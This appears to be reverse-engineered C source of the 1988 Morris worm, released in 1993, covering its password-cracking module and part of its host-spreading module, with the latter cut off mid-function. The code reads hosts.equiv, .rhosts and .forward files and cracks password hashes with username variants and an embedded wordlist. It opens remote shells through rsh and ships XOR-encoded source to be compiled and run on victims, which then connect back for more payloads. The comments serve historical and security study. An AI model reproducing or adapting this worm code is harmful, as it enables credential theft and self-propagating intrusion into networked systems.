/* Released by gobo in 1993, send e-mail to Gobo@dutiba.twi.tudelft.nl */

#include "worm.h"
#include <stdio.h>
#include <ctype.h>
#include <strings.h>
#include <pwd.h>

int cmode;
extern struct hst *h_name2host();

struct usr {                    /* sizeof(usr) == 58 */
    char *name, *o4, *o8, *o12;
    char passwd[14];                /* offset 16 */
    char decoded_passwd[14];            /* 30 */
    short pad;
    char *homedir;              /* offset 46 */
    char *gecos;                /* offset 50 */
    struct usr *next;               /* offset 54 */
};

/* Ahhh, I just love these names.  Don't change them for anything. */
static struct usr *x27f28, *x27f2c;

/* Crack some passwords. */
cracksome()
{
    switch (cmode){
    case 0:
    strat_0();
    return;                 /* 88 */
    case 1:
    strat_1();
    return;
    case 2:
    try_words();
    return;
    case 3:
    dict_words();
    return;
    }
}

/* Strategy 0, look through /etc/hosts.equiv, and /.rhost for new hosts */
strat_0()                   /* 0x5da4 */
{
    FILE *hosteq;
    char scanbuf[512];
    char fwd_buf[256];
    char *fwd_host;
    char getbuf[256];
    struct passwd *pwent;
    char local[20];
    struct usr *user;
    struct hst *host;               /* 1048 */
    int check_other_cnt;            /* 1052 */
    static struct usr *user_list = NULL;

    hosteq = fopen(XS("/etc/hosts.equiv"), XS("r"));
    if (hosteq != NULL) {           /* 292 */
    while (fscanf(hosteq, XS("%.100s"), scanbuf)) {
        host = h_name2host(scanbuf, 0);
        if (host == 0) {
        host = h_name2host(scanbuf, 1);
        getaddrs(host);
        }
        if (host->o48[0] == 0)      /* 158 */
        continue;
        host->flag |= 8;
    }
    fclose(hosteq);             /* 280 */
    }

    hosteq = fopen(XS("/.rhosts"), XS("r"));
    if (hosteq != NULL) {           /* 516 */
    while (fgets(getbuf, sizeof(getbuf), hosteq)) { /* 344,504 */
        if (sscanf(getbuf, XS("%s"), scanbuf) != 1)
        continue;
        host = h_name2host(scanbuf, 0);
        while (host == 0) {         /* 436, 474 */
        host = h_name2host(scanbuf, 1);
        getaddrs(host);
        }
        if (host->o48[0] == 0)
        continue;
        host->flag |= 8;
    }
    fclose(hosteq);
    }

    /* look through the passwd file, checking for contact with others every
     * tenth entry. */
    setpwent();
    check_other_cnt = 0;                    /* 522 */
    while ((pwent = getpwent()) != 0) {     /* 526, 1124 */
    if ((check_other_cnt % 10) == 0)
        other_sleep(0);
    check_other_cnt++;
    sprintf(fwd_buf, XS("%.200s/.forward"), pwent->pw_dir);
    hosteq = fopen(fwd_buf, XS("r"));
    if (hosteq != NULL) {           /* 834 */
        while (fgets(scanbuf, sizeof(scanbuf), hosteq)) { /* 650,822 */
        /* Punt the newline */
        (&scanbuf[strlen(scanbuf)])[-1] = '\0';
        fwd_host = index(scanbuf, '@');
        if (fwd_host == NULL)
            continue;
        host = h_name2host(++fwd_host, 0);
        if (host == NULL) {
            host = h_name2host(fwd_host, 1);
            getaddrs(host);
        }
        if (host->o48[0] == 0)
            continue;
        host->flag |= 8;
        }
        fclose(hosteq);
    }
    /* Don't do foreign or compilcated hosts */
    if (strlen(host->hostname) > 11)
        continue;
    user = (struct usr *)malloc(sizeof(struct usr));
    strcpy(user->name, pwent->pw_name);
    strcpy(&user->passwd[0], XS("x"));
    user->decoded_passwd[0] = '\0';
    user->homedir = strcpy(malloc(strlen(pwent->pw_dir)+1), pwent->pw_dir);
    user->gecos = strcpy(malloc(strlen(pwent->pw_gecos)+1), pwent->pw_gecos
);
    user->next = user_list;
    user_list = user;
    }
    endpwent();
    cmode = 1;
    x27f2c = user_list;
    return;
}

/* Check for 'username', 'usernameusername' and 'emanresu' as passwds. */
static strat_1()                /* 0x61ca */
{
    int cnt;
    char usrname[50], buf[50];

    for (cnt = 0; x27f2c && cnt < 50; x27f2c = x27f2c->next) { /* 1740 */
    /* Every tenth time look for "me mates" */
    if ((cnt % 10) == 0)
        other_sleep(0);
    /* Check for no passwd */
    if (try_passwd(x27f2c, XS("")))         /* other_fd+84 */
        continue;           /* 1722 */
    /* If the passwd is something like "*" punt matching it. */
    if (strlen(x27f2c->passwd) != 13)
        continue;
    strncpy(usrname, x27f2c, sizeof(usrname)-1);
    usrname[sizeof(usrname)-1] = '\0';
    if (try_passwd(x27f2c, usrname))
        continue;
    sprintf(buf, XS("%.20s%.20s"), usrname, usrname);
    if (try_passwd(x27f2c, buf))
        continue;               /* 1722 */
    sscanf(x27f2c->gecos, XS("%[^ ,]"), buf);
    if (isupper(buf[0]))
        buf[0] = tolower(buf[0]);
    if (strlen(buf) > 3  && try_passwd(x27f2c, buf))
        continue;
    buf[0] = '\0';
    sscanf(x27f2c->gecos, XS("%*s %[^ ,]s"), buf);
    if (isupper(buf[0]))
        buf[0] = tolower(buf[0]);
    if (strlen(buf) > 3  && index(buf, ',') == NULL  &&
        try_passwd(x27f2c, buf))
        continue;
    reverse_str(usrname, buf);
    if (try_passwd(x27f2c, buf))
        ;
    }
    if (x27f2c == 0)
    cmode = 2;
    return;
}

static reverse_str(str1, str2)          /* x642a */
     char *str1, *str2;
{
    int length, i;

    length = strlen(str1);

    for(i = 0; i < length; i++)
    str2[i] = (&str1[length-i]) [-1];
    str2[length] = '\0';
    return;
}

static try_passwd(user, str)            /* 0x6484, unchecked */
     struct usr *user;
     char *str;
{
    if (strcmp(user->passwd, crypt(str, user->passwd)) == 0  ||
    (str[0] == '\0'  &&  user->passwd == '\0')) {
        strncpy(user->decoded_passwd, str, sizeof(user->decoded_passwd));
        user->decoded_passwd[sizeof(user->decoded_passwd)-1] = '\0';
        attack_user(user);
        return 1;
    }
    return 0;
}


/* Collect hostnames and run hueristic #1 for this user's .forward and .rhosts
 */
/* This is only called from try_passwd() */
static attack_user(user)            /* 0x6514 */
     struct usr *user;
{
    FILE *fwd_fp;
    char buf[512], *hostpart;           /* l516 */
    char rhbuf[256];                /* l776 */
    char l1288[512];
    struct hst *host;               /* l1292 */

    sprintf(buf, XS("%.200s/.forward"), user->homedir); /* <other_fd+11
5> */
    fwd_fp = fopen(buf, XS("r"));
    if (fwd_fp) {
    while (fgets(buf, sizeof(buf), fwd_fp)) { /* 2088,2222 */
        /* Punt the newline */
        buf[strlen(buf) - 1] = '\0';
        hostpart = index(buf, '@');
        /* If no hostname, it's not foreign so ignore it. */
        if (hostpart == NULL)
        continue;
        /* Split username and hostname */
        *hostpart++ = '\0';

        /* Here there appears to be a bug!!!  It works correctly
         * by coincidence of pushing things on the stack. */
#ifndef FIX_BUGS
        host = h_name2host(hostpart, 1);
        hu1(user, host, buf);
#else                       /* original */
        /* 'hu1' should have another argument */
        hu1(user, (host = h_name2host(hostpart, 1, buf)));
#endif

    }
    fclose(fwd_fp);
    }

    sprintf(buf, XS("%.200s/.rhosts"), user->homedir);
    fwd_fp = fopen(buf, XS("r"));
    if (fwd_fp) {               /* 2446 */
    while (fgets(rhbuf, sizeof(rhbuf), fwd_fp)) { /* 2312,2434 */
        l1288[0] = '\0';
        if (sscanf(rhbuf, XS("%s%s"), buf, l1288) < 1)
        continue;
        host = h_name2host(buf, 1);
        hu1(user, host, l1288);
    }
    fclose(fwd_fp);
    }
    return;
}

/* This array in the sun binary was camaflouged by having the
   high-order bit set in every char. */

char *wds[] =                   /* 0x21a74 */
{
    "academia", "aerobics", "airplane", "albany",
    "albatross", "albert", "alex", "alexander",
    "algebra", "aliases", "alphabet", "amorphous",
    "analog", "anchor", "andromache", "animals",
    "answer", "anthropogenic", "anvils", "anything",
    "aria", "ariadne", "arrow", "arthur",
    "athena", "atmosphere", "aztecs", "azure",
    "bacchus", "bailey", "banana", "bananas",
    "bandit", "banks", "barber", "baritone",
    "bass", "bassoon", "batman", "beater",
    "beauty", "beethoven", "beloved", "benz",
    "beowulf", "berkeley", "berliner", "beryl",
    "beverly", "bicameral", "brenda", "brian",
    "bridget", "broadway", "bumbling", "burgess",
    "campanile", "cantor", "cardinal", "carmen",
    "carolina", "caroline", "cascades", "castle",
    "cayuga", "celtics", "cerulean", "change",
    "charles", "charming", "charon", "chester",
    "cigar", "classic", "clusters", "coffee",
    "coke", "collins", "commrades", "computer",
    "condo", "cookie", "cooper", "cornelius",
    "couscous", "creation", "creosote", "cretin",
    "daemon", "dancer", "daniel", "danny",
    "dave", "december", "defoe", "deluge",
    "desperate", "develop", "dieter", "digital",
    "discovery", "disney", "drought", "duncan",
    "eager", "easier", "edges", "edinburgh",
    "edwin", "edwina", "egghead", "eiderdown",
    "eileen", "einstein", "elephant", "elizabeth",
    "ellen", "emerald", "engine", "engineer",
    "enterprise", "enzyme", "ersatz", "establish",
    "estate", "euclid", "evelyn", "extension",
    "fairway", "felicia", "fender", "fermat",
    "fidelity", "finite", "fishers", "flakes",
    "float", "flower", "flowers", "foolproof",
    "football", "foresight", "format", "forsythe",
    "fourier", "fred", "friend", "frighten",
    "fungible", "gabriel", "gardner", "garfield",
    "gauss", "george", "gertrude", "ginger",
    "glacier", "golfer", "gorgeous", "gorges",
    "gosling", "gouge", "graham", "gryphon",
    "guest", "guitar", "gumption", "guntis",
    "hacker", "hamlet", "handily", "happening",
    "harmony", "harold", "harvey", "hebrides",
    "heinlein", "hello", "help", "herbert",
    "hiawatha", "hibernia", "honey", "horse",
    "horus", "hutchins", "imbroglio", "imperial",
    "include", "ingres", "inna", "innocuous",
    "irishman", "isis", "japan", "jessica",
    "jester", "jixian", "johnny", "joseph",
    "joshua", "judith", "juggle", "julia",
    "kathleen", "kermit", "kernel", "kirkland",
    "knight", "ladle", "lambda", "lamination",
    "larkin", "larry", "lazarus", "lebesgue",
    "leland", "leroy", "lewis", "light",
    "lisa", "louis", "lynne", "macintosh",
    "mack", "maggot", "magic", "malcolm",
    "mark", "markus", "marty", "marvin",
    "master", "maurice", "mellon", "merlin",
    "mets", "michael", "michelle", "mike",
    "minimum", "minsky", "moguls", "moose",
    "morley", "mozart", "nancy", "napoleon",
    "nepenthe", "ness", "network", "newton",
    "next", "noxious", "nutrition", "nyquist",
    "oceanography", "ocelot", "olivetti", "olivia",
    "oracle", "orca", "orwell", "osiris",
    "outlaw", "oxford", "pacific", "painless",
    "pakistan", "papers", "password", "patricia",
    "penguin", "peoria", "percolate", "persimmon",
    "persona", "pete", "peter", "philip",
    "phoenix", "pierre", "pizza", "plover",
    "plymouth", "polynomial", "pondering", "pork",
    "poster", "praise", "precious", "prelude",
    "prince", "princeton", "protect", "protozoa",
    "pumpkin", "puneet", "puppet", "rabbit",
    "rachmaninoff", "rainbow", "raindrop", "raleigh",
    "random", "rascal", "really", "rebecca",
    "remote", "rick", "ripple", "robotics",
    "rochester", "rolex", "romano", "ronald",
    "rosebud", "rosemary", "roses", "ruben",
    "rules", "ruth", "saxon", "scamper",
    "scheme", "scott", "scotty", "secret",
    "sensor", "serenity", "sharks", "sharon",
    "sheffield", "sheldon", "shiva", "shivers",
    "shuttle", "signature", "simon", "simple",
    "singer", "single", "smile", "smiles",
    "smooch", "smother", "snatch", "snoopy",
    "soap", "socrates", "sossina", "sparrows",
    "spit", "spring", "springer", "squires",
    "strangle", "stratford", "stuttgart", "subway",
    "success", "summer", "super", "superstage",
    "support", "supported", "surfer", "suzanne",
    "swearer", "symmetry", "tangerine", "tape",
    "target", "tarragon", "taylor", "telephone",
    "temptation", "thailand", "tiger", "toggle",
    "tomato", "topography", "tortoise", "toyota",
    "trails", "trivial", "trombone", "tubas",
    "tuttle", "umesh", "unhappy", "unicorn",
    "unknown", "urchin", "utility", "vasant",
    "vertigo", "vicky", "village", "virginia",
    "warren", "water", "weenie", "whatnot",
    "whiting", "whitney", "will", "william",
    "williamsburg", "willie", "winston", "wisconsin",
    "wizard", "wombat", "woodwind", "wormwood",
    "yacov", "yang", "yellowstone", "yosemite",
    "zimmerman",
    0
};
int nextw = 0;                  /* 0x24868 */

/* Try a list of potential passwds for each user. */
static try_words()              /* 0x66da */
{
    struct usr *user;
    int i, j;

    if (wds[nextw] == 0) {
    cmode++;
    return;                 /* 2724 */
    }
    if (nextw == 0) {               /* 2550 */
    for (i = 0; wds[i]; i++)
        ;
    permute(wds, i, sizeof(wds[0]));
    }

    for (j = 0; wds[nextw][j] != '\0'; j++)
    wds[nextw][j] &= 0x7f;
    for (user = x27f28; user; user = user->next)
    try_passwd(user, wds[nextw]);
    for (j = 0; wds[nextw][j]; j++)     /* 2664,2718 */
    wds[nextw][j] |= 0x80;
    nextw += 1;
    return;
}


/* Called only from the cracksome() dispatch loop. Tries a single word from th
e
 * dictionary, downcasing if capitalized and trying again. */
static dict_words()             /* 0x67f0 */
{
    char buf[512];
    struct usr *user;
    static FILE *x27f30;

    if (x27f30 != NULL) {
    x27f30 = fopen(XS("/usr/dict/words"), XS("r"));
    if (x27f30 == NULL)
        return;
    }
    if (fgets(buf, sizeof(buf), x27f30) == 0) { /* 2808,2846 */
    cmode++;
    return;
    }
    (&buf[strlen(buf)])[-1] = '\0';

    for (user = x27f28; user; user = user->next) /* 2910 */
    try_passwd(user, buf);
    if (!isupper(buf[0]))
    return;
    buf[0] = tolower(buf[0]);

    for (user = x27f28; user; user = user->next)
    try_passwd(user, buf);
    return;                 /* 2988 */
}
    
/*
 * Local variables:
 * comment-column: 48
 * compile-command: "cc -S cracksome.c"
 * End:
 */

*****
** hs.c
*****


/* dover */
/* released by gobo in 1993, send e-mail to Gobo@dutiba.twi.tudelft.nl */

#include "worm.h"
#include <stdio.h>
#include <strings.h>
#include <signal.h>
#include <errno.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <sys/file.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netinet/in.h>

extern struct hst *h_addr2host(), *h_name2host();
extern int  justreturn();
extern int errno;
extern char *malloc();

int alarmed = 0;
int ngateways, *gateways;
struct hst *me, *hosts;

int nifs;
struct ifses ifs[30];               /*  Arbitrary number, fix */

/* Clean hosts not contacted from the host list. */
h_clean()                   /* 0x31f0 */
{
    struct hst *newhosts, *host, *next;
    
    newhosts = NULL;
    for (host = hosts; host != NULL; host = next) {
    next = host->next;
    host->flag &= -7;
    if (host == me || host->flag != 0) {
        host->next = newhosts;
        newhosts = host;
    } else
        free(host);
    }
    hosts = newhosts;
}

/* Look for a gateway we can contact. */
hg()                /* 0x3270, check again */
{
    struct hst *host;
    int i;
    
    rt_init();
    
    for (i = 0; i < ngateways; i++) {       /* 24, 92 */
    host = h_addr2host(gateways[i], 1);
    if (try_rsh_and_mail(host))
        return 1;
    }
    return 0;
}

ha()                        /* 0x32d4, unchecked */
{
    struct hst *host;
    int i, j, k;
    int l416[100];
    int l420;
    
    if (ngateways < 1)
    rt_init();
    j = 0;
    for (i = 0; i < ngateways; i++) {       /* 40, 172 */
    host = h_addr2host(gateways[i], 1);
    for (k = 0; k < 6; k++) {       /* 86, 164 */
        if (host->o48[k] == 0)
        continue;           /* 158 */
        if (try_telnet_p(host->o48[k]) == 0)
        continue;
        l416[j] = host->o48[k];
        j++;
    }
    }
    
    permute(l416, j, sizeof(l416[0]));
    
    for (i = 0; i < j; i++) {           /* 198, 260 */
    if (hi_84(l416[i] & netmaskfor(l416[i])))
        return 1;
    }
    return 0;
}

hl()                        /* 0x33e6 */
{
    int i;
    
    for (i = 0; i < 6; i++) {           /* 18, 106 */
    if (me->o48[i] == 0)
        break;
    if (hi_84(me->o48[i] & netmaskfor(me->o48[i])) != 0)
        return 1;
    }
    return 0;
}

hi()                        /* 0x3458 */
{
    struct hst *host;
    
    for (host = hosts; host; host = host->next )
    if ((host->flag & 0x08 != 0) && (try_rsh_and_mail(host) != 0))
        return 1;
    return 0;
}

hi_84(arg1)                 /* 0x34ac */
{
    int l4;
    struct hst *host;
    int l12, l16, l20, i, l28, adr_index, l36, l40, l44;
    int netaddrs[2048];
    
    l12 = netmaskfor(arg1);
    l16 = ~l12;
    
    for (i = 0; i < nifs; i++) {        /* 128,206 */
    if (arg1 == (ifs[i].if_l24 & ifs[i].if_l16))
        return 0;               /* 624 */
    }
    
    adr_index = 0;
    if (l16 == 0x0000ffff) {            /* 330 */
    l44 = 4;
    for (l40 = 1; l40 < 255; l40++)     /* 236,306 */
        for (l20 = 1; l20 <= 8; l20++)  /* 254,300 */
        netaddrs[adr_index++] = arg1 | (l20 << 16) | l40;
    permute(netaddrs, adr_index, sizeof(netaddrs[0]));
    } else {                    /* 432 */
    l44 = 4;
    for (l20 = 1; l20 < 255; l20++)
        netaddrs[adr_index++] = (arg1 | l20);
    permute(netaddrs, 3*sizeof(netaddrs[0]), sizeof(netaddrs[0]));
    permute(netaddrs, adr_index - 6, 4);
    }
    if (adr_index > 20)
    adr_index = 20;
    for (l36 = 0; l36 < adr_index; l36++) { /* 454,620 */
    l4 = netaddrs[l36];
    host = h_addr2host(l4, 0);
    if (host == NULL || (host->flag & 0x02) == 0)
        continue;
    if (host == NULL || (host->flag & 0x04) == 0 ||
        command_port_p(l4, l44) == 0)
        continue;
    if (host == NULL)
        host = h_addr2host(l4, 1);
    if (try_rsh_and_mail(host))
        return 1;
    }
    return 0;
}

/* Only called in the function above */
static command_port_p(addr, time)       /* x36d2, <hi+634> */
     u_long addr;
     int time;
{
    int s, connection;                  /* 28 */
    struct sockaddr_in sin;         /* 16 bytes */
    int (*save_sighand)();
    
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0)
    return 0;
    bzero(&sin, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = addr;
    sin.sin_port = IPPORT_CMDSERVER;        /* Oh no, not the command serve
r... */
    
    save_sighand = signal(SIGALRM, justreturn);     /* Wakeup if it
 fails */
    
    /* Set up a timeout to break from connect if it fails */
    if (time < 1)
    time = 1;
    alarm(time);
    connection = connect(s, &sin, sizeof(sin));
    alarm(0);
    
    close(s);
    
    if (connection < 0 && errno == ENETUNREACH)
    error("Network unreachable");
    return connection != -1;
}

static try_telnet_p(addr)           /* x37b2 <hi+858>, checked */
     u_long addr;
{
    int s, connection;                  /* 28 */
    struct sockaddr_in sin;         /* 16 bytes */
    int (*save_sighand)();
    
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0)
    return 0;
    bzero(&sin, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = addr;
    sin.sin_port = IPPORT_TELNET;       /* This time try telnet... */
    
    /* Set up a 5 second timeout, break from connect if it fails */
    save_sighand = signal(SIGALRM, justreturn);
    alarm(5);
    connection = connect(s, &sin, sizeof(sin));
    if (connection < 0  &&  errno == ECONNREFUSED) /* Telnet connection refuse
d */
    connection = 0;
    alarm(0);                   /* Turn off timeout */
    
    close(s);
    
    return connection != -1;
}

/* Used in hg(), hi(), and hi_84(). */
static try_rsh_and_mail(host)               /* x3884, <hi+1068> */
     struct hst *host;
{
    int fd1, fd2, result;
    
    if (host == me)
    return 0;               /* 1476 */
    if (host->flag & 0x02)
    return 0;
    if (host->flag & 0x04)
    return 0;
    if (host->o48[0] == 0 || host->hostname == NULL)
    getaddrs(host);
    if (host->o48[0] == 0) {
    host->flag |= 0x04;
    return 0;
    }
    other_sleep(1);
    if (host->hostname  &&      /* 1352 */
    fork_rsh(host->hostname, &fd1, &fd2,
          XS("exec /bin/sh"))) {        /* <env+188> */
    result = talk_to_sh(host, fd1, fd2);
    close(fd1);
    close(fd2);
    /* Prevent child from hanging around in the <exiting> state */
    wait3((union wait *)NULL, WNOHANG, (struct rusage *)NULL);
    if (result != 0)
        return result;
    }
    
    if (try_finger(host, &fd1, &fd2)) {     /* 1440 */
    result = talk_to_sh(host, fd1, fd2);
    close(fd1);
    close(fd2);
    if (result != 0)
        return result;
    }
    if (try_mail(host))
    return 1;
    
    host->flag |= 4;
    return 0;
}


/* Check a2in() as it is updated */
/* Used in twice in try_rsh_and_mail(), once in hu1(). */
static talk_to_sh(host, fdrd, fdwr)     /* x3a20, Checked, changed <hi+
>*/
     struct hst *host;
     int fdrd, fdwr;
{
    object *objectptr;
    char send_buf[512];             /* l516 */
    char print_buf[52];             /* l568 */
    int l572, l576, l580, l584, l588,  l592;
    
    objectptr = getobjectbyname(XS("l1.c"));    /* env 200c9 */
    
    if (objectptr == NULL)
    return 0;               /* <hi+2128> */
    if (makemagic(host, &l592, &l580, &l584, &l588) == 0)
    return 0;
    send_text(fdwr, XS("PATH=/bin:/usr/bin:/usr/ucb\n"));
    send_text(fdwr, XS("cd /usr/tmp\n"));
    l576 = random() % 0x00FFFFFF;
    
    sprintf(print_buf, XS("x%d.c"), l576);
    /* The 'sed' script just puts the EOF on the transmitted program. */
    sprintf(send_buf, XS("echo gorch49;sed \'/int zz;/q\' > %s;echo gorch50\n"
),
        print_buf);
    
    send_text(fdwr, send_buf);
    
    wait_for(fdrd, XS("gorch49"), 10);
    
    xorbuf(objectptr->buf, objectptr->size);
    l572 = write(fdwr, objectptr->buf, objectptr->size);
    xorbuf(objectptr->buf, objectptr->size);
    
    if (l572 != objectptr->size) {
    close(l588);
    return 0;               /* to <hi+2128> */
    }
    send_text(fdwr, XS("int zz;\n\n"));
    wait_for(fdrd, XS("gorch50"), 30);
    
#define COMPILE  "cc -o x%d x%d.c;./x%d %s %d %d;rm -f x%d x%d.c;echo DONE\n"
    sprintf(send_buf, XS(COMPILE), l576, l576, l576,
        inet_ntoa(a2in(l592)), l580, l584, l576, l576);
    
    
    send_text(fdwr, send_buf);
    
    if (wait_for(fdrd, XS("DONE"), 100) == 0) {
    close(l588);
    return 0;               /* <hi+2128> */
    }
    return waithit(host, l592, l580, l584, l588);
}

makemagic(arg8, arg12, arg16, arg20, arg24) /* checked */
     struct hst *arg8;
     int *arg12, *arg16, *arg20, *arg24;
{
    int s, i, namelen;
    struct sockaddr_in sin0, sin1;      /* 16 bytes */
    
    *arg20 = random() & 0x00ffffff;
    bzero(&sin1, sizeof(sin1));
    sin1.sin_addr.s_addr = me->l12;
    
    for (i= 0; i < 6; i++) {            /* 64, 274 */
    if (arg8->o48[i] == NULL)
        continue;               /* 266 */
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0)
        return 0;               /* 470 */
    bzero(&sin0, sizeof(sin0));
    sin0.sin_family = AF_INET;
    sin0.sin_port = IPPORT_TELNET;
    sin0.sin_addr.s_addr = arg8->o48[i];
    errno = 0;
    if (connect(s, &sin0, sizeof(sin0)) != -1) {
        namelen = sizeof(sin1);
        getsockname(s, &sin1, &namelen);
        close(s);
        break;
    }
    close(s);
    }
    
    *arg12 = sin1.sin_addr.s_addr;
    
    for (i = 0; i < 1024; i++) {        /* 286,466 */
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0)
        return 0;               /* 470 */
    bzero(&sin0, sizeof(sin0));
    sin0.sin_family = AF_INET;
    sin0.sin_port = random() % 0xffff;
    if (bind(s, &sin0, sizeof(sin0)) != -1) {
        listen(s, 10);
        *arg16 = sin0.sin_port;
        *arg24 = s;
        return 1;
    }
    close(s);
    }
    
    return 0;
}

/* Check for somebody connecting.  If there is a connection and he has the rig
ht
 * key, send out the
 * a complete set of encoded objects to it. */

waithit(host, arg1, arg2, key, arg4)        /* 0x3e86 */
     struct hst *host;
{
    int (*save_sighand)();
    int l8, sin_size, l16, i, l24, l28;
    struct sockaddr_in sin;         /* 44 */
    object *obj;
    char files[20][128];            /* File list, 2608 */
    char *l2612;
    char strbuf[512];
    
    save_sighand = signal(SIGPIPE, justreturn);
    
    sin_size = sizeof(sin);
    alarm(2*60);
    l8 = accept(arg4, &sin, &sin_size);
    alarm(0);
    
    if (l8 < 0)
    goto quit;              /* 1144 */
    if (xread(l8, &l16, sizeof(l16), 10) != 4)
    goto quit;
    l16 = ntohl(l16);
    if (key != l16)
    goto quit;
    for (i = 0; i < nobjects; i++) {    /* 164,432 */
    obj = &objects[i];
    l16 = htonl(obj->size);
    write(l8, &l16, sizeof(l16));
    sprintf(files[i], XS("x%d,%s"),
        (random()&0x00ffffff), obj->name);
    write(l8, files[i], sizeof(files[0]));
    xorbuf(obj->buf, obj->size);
    l24 = write(l8, obj->buf, obj->size);
    xorbuf(obj->buf, obj->size);
    if (l24 != obj->size)
        goto quit;
    }
    
    /* Get rid of my client's key, and tell him the list has ended. */
    l16 = -1;
    if (write(l8, &l16, sizeof(l16)) != 4)
    goto quit;
    
    /* Don't run up the load average too much... */
    sleep(4);
    
    if (test_connection(l8, l8, 30) == 0)
    goto quit;
    send_text(l8, XS("PATH=/bin:/usr/bin:/usr/ucb\n"));
    send_text(l8, XS("rm -f sh\n"));
    
    sprintf(strbuf, XS("if [ -f sh ]\nthen\nP=x%d\nelse\nP=sh\nfi\n"),
        random()&0x00ffffff);
    send_text(l8, strbuf);
    
    for (i = 0; i < nobjects; i++) {    /* 636,1040 */
    if ((l2612 = index(files[i], '.')) == NULL ||
        l2612[1] != 'o')
        continue;
    sprintf(strbuf, XS("cc -o $P %s\n"), files[i]);
    send_text(l8, strbuf);
    if (test_connection(l8, l8, 30) == 0)
        goto quit;              /* 1144 */
    sprintf(strbuf, XS("./$P -p $$ "));
    for(l28 = 0; l28 < nobjects; l28++) {   /* 820,892 */
        strcat(strbuf, files[l28]);
        strcat(strbuf, XS(" "));
    }
    strcat(strbuf, XS("\n"));
    send_text(l8, strbuf);
    if (test_connection(l8, l8, 10) == 0) {
        close(l8);
        close(arg4);
        host->flag |= 2;
        return 1;               /* 1172 */
    }
    send_text(l8, XS("rm -f $P\n"));
    }
    
    for (i = 0; i < nobjects; i++) {    /* 1044,1122 */
    sprintf(strbuf, XS("rm -f %s $P\n"), files[i]);
    send_text(l8, strbuf);
    }
    test_connection(l8, l8, 5);
 quit:
    close(l8);
    close(l24);
    return 0;
}

/* Only called from within mail */
static compile_slave(host, s, arg16, arg20, arg24) /* x431e, <waithit+1176> */
     struct hst host;
{     
    object *obj;
    char buf[512];              /* 516 */
    char cfile[56];             /* 568 */
    int wr_len, key;                /* might be same */
    
    obj = getobjectbyname(XS("l1.c"));
    if (obj == NULL)
    return 0;               /* 1590 */
    send_text(s, XS("cd /usr/tmp\n"));
    
    key = (random() % 0x00ffffff);
    sprintf(cfile, XS("x%d.c"), key);
    sprintf(buf, XS("cat > %s <<\'EOF\'\n"), cfile);
    send_text(s, buf);
    
    xorbuf(obj->buf, obj->size);
    wr_len = write(s, obj->buf, obj->size);
    xorbuf(obj->buf, obj->size);
    
    if (wr_len != obj->size)
    return 0;
    send_text(s, XS("EOF\n"));
    
    sprintf(buf, XS("cc -o x%d x%d.c;x%d %s %d %d;rm -f x%d x%d.c\n"),
        key, key, key,
        inet_ntoa(a2in(arg16, arg20, arg24, key, key)->baz));
    return send_text(s, buf);
}

static send_text(fd, str)           /* 0x44c0, <waithit+1594> */
     char *str;
{
    write(fd, str, strlen(str));
}

/* Used in try_rsh_and_mail(). */
static fork_rsh(host, fdp1, fdp2, str)      /* 0x44f4, <waithit+1646> */
     char *host;
     int *fdp1, *fdp2;
     char *str;
{
    int child;                  /* 4 */
    int fildes[2];              /* 12 */
    int fildes1[2];             /* 20 */
    int fd;
    
    if (pipe(fildes) < 0)
    return 0;
    if (pipe(fildes1) < 0) {
    close(fildes[0]);
    close(fildes[1]);
    return 0;
    }
    
    child = fork();
    if (child < 0) {                /* 1798 */
    close(fildes[0]);
    close(fildes[1]);
    close(fildes1[0]);
    close(fildes1[1]);
    return 0;
    }
    if (child == 0) {               /* 2118 */
    for (fd = 0; fd < 32; fd++)
        if (fd != fildes[0] &&
        fd != fildes1[1] &&
        fd != 2)
        close(fd);
    dup2(fildes[0], 0);
    dup2(fildes[1], 1);
    if (fildes[0] > 2)
        close(fildes[0]);
    if (fildes1[1] > 2)
        close(fildes1[1]);
    /* 'execl()' does not return if it suceeds. */
    execl(XS("/usr/ucb/rsh"), XS("rsh"), host, str, 0);
    execl(XS("/usr/bin/rsh"), XS("rsh"), host, str, 0);
    execl(XS("/bin/rsh"), XS("rsh"), host, str, 0);
    exit(1);
    }
    close(fildes[0]);
    close(fildes1[1]);
    *fdp1 = fildes1[0];
    *fdp2 = fildes[1];
    
    if (test_connection(*fdp1, *fdp2, 30))
    return 1;               /* Sucess!!! */
    close(*fdp1);
    close(*fdp2);
    kill(child, 9);
    /* Give the child a chance to die from the signal. */
    sleep(1);
    wait3(0, WNOHANG, 0);
    return 0;
}

static test_connection(rdfd, wrfd, time)            /* x476c,<waith
it+2278> */
     int rdfd, wrfd, time;
{
    char combuf[100], numbuf[100];
    
    sprintf(numbuf, XS("%d"), random() & 0x00ffffff);
    sprintf(combuf, XS("\n/bin/echo %s\n"), numbuf);
    send_text(wrfd, combuf);
    return wait_for(rdfd, numbuf, time);
}

static wait_for(fd, str, time)          /* <waithit+2412> */
     int fd, time;
     char *str;
{
    char buf[512];
    int i, length;
    
    length = strlen(str);
    while (x488e(fd, buf, sizeof(buf), time) == 0) { /* 2532 */
    for(i = 0; buf[i]; i++) {
        if (strncmp(str, &buf[i], length) == 0)
        return 1;
    }
    }
    return 0;
}

/* Installed as a signal handler */
justreturn(sig, code, scp)                  /* 0x4872 */
     int sig, code;
     struct sigcontext *scp;
{
    alarmed = 1;
}

static x488e(fd, buf, num_chars, maxtime)
     int fd, num_chars, maxtime;
     char *buf;
{   
    
    int i, l8, readfds;
    struct timeval timeout;
    
    for (i = 0; i < num_chars; i++) {       /* 46,192 */
    readfds = 1 << fd;
    timeout.tv_usec = maxtime;
    timeout.tv_sec = 0;
    if (select(fd + 1, &readfds, 0, 0, &timeout) <= 0)
        return 0;
    if (readfds == 0)
        return 0;
    if (read(fd, &buf[i], 1) != 1)
        return 0;
    if (buf[i] == '\n')
        break;
    }
    buf[i] = '\0';
    if (i > 0 && l8 > 0)
    return 1;
    return 0;
}

/* This doesn't appear to be used anywhere??? */
static char *movstr(arg0, arg1)         /* 0x4958,<just_return+
230> */
     char *arg0, *arg1;
{
    arg1[0] = '\0';
    if (arg0 == 0)
    return 0;
    while( ! isspace(*arg0))
